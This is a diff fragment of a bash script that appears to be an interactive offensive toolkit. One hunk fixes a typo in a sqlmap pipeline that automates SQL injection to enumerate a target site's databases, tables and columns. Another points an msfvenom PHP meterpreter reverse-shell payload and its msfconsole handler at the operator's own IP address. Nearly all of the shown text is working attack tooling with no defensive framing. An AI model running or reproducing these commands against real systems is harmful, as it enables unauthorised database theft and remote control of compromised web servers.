@@ -806,7 +806,7 @@ while true; do
 				if grep -q "$index" <<< "$url"; then
 					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1) 
 					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database");
-					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table");
+					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table");
 					Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)
 					echo "$Columns"
 					sleep 1
@@ -863,9 +863,9 @@ while true; do
 			##      Reverse Shell PHP      ##
 			##-----------------------------##
 			if [[ $reverseshell == "1" ]]; then
-				msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=443 -o shell.php
+				msfvenom -p php/meterpreter_reverse_tcp lhost=$myip lport=443 -o shell.php
 				sleep 3
-				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set payload php/meterpreter_reverse_tcp; run; exit -y"
+				msfconsole -q -x "use exploit/multi/handler; set LHOST $myip; set LPORT 443; set payload php/meterpreter_reverse_tcp; run; exit -y"
 
 			##-----------------------------##
 			##     Reverse Shell Linux     ##
